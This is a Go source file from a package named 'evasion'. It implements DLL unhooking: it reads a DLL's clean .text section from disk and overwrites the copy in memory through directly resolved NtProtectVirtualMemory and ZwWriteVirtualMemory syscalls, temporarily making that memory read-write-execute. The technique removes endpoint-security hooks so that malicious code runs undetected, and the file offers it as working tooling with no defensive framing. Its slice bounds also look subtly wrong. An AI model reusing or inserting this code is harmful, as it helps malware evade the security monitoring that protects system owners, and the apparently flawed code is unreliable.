package evasion

import (
	"debug/pe"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	NtProtectVirtualMemory uintptr = resolveSyscall64("NtProtectVirtualMemory")
	ZwWriteVirtualMemory   uintptr = resolveSyscall64("ZwWriteVirtualMemory")
	dwOldProtection        uint32
	thisThread             = uintptr(0xffffffffffffffff)
)

func UnHookDll(name string) error {
	// read clean dll from disk
	cleanDll, err := os.ReadFile(name)
	if err != nil {
		return err
	}
	// read clean dll as PE
	peDll, err := pe.Open(name)
	if err != nil {
		return err
	}
	// read .text section of peDll
	txt := peDll.Section(".text")
	// get clean bytes from .text section
	cleanBytes := cleanDll[txt.Offset:txt.Size]
	return writeCleanBytes(cleanBytes, name, txt.VirtualAddress)
}

func writeCleanBytes(clean []byte, name string, voffset uint32) error {
	// load target dll
	tDll, e := syscall.LoadDLL(name)
	if e != nil {
		return e
	}
	// get handle of target dll
	htDll := tDll.Handle
	// find base addr of dll
	dllBase := uintptr(htDll)
	// calculate offset to .text section
	dllOffset := uint(dllBase) + uint(voffset)
	size_t := len(clean)

	// change memory protection to RWX (NtProtectVirtualMemory)
	_, _, err := syscall.SyscallN(
		NtProtectVirtualMemory,
		uintptr(thisThread),
		uintptr(unsafe.Pointer(&dllOffset)),
		uintptr(unsafe.Pointer(&size_t)),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&dwOldProtection)),
	)
	if err != 0 {
		return err
	}

	// write our clean bytes (ZwWriteVirtualMemory)
	_, _, err = syscall.SyscallN(
		ZwWriteVirtualMemory,
		uintptr(thisThread),
		uintptr(dllOffset),
		uintptr(unsafe.Pointer(&clean[0])),
		uintptr(len(clean)),
		0,
	)
	if err != 0 {
		return err
	}

	// restore original memory protection (NtProtectVirtualMemory)
	_, _, err = syscall.SyscallN(
		NtProtectVirtualMemory,
		uintptr(thisThread),
		uintptr(unsafe.Pointer(&dllOffset)),
		uintptr(unsafe.Pointer(&size_t)),
		uintptr(dwOldProtection),
		uintptr(unsafe.Pointer(&dwOldProtection)),
	)
	if err != 0 {
		return err
	}
	return nil
}
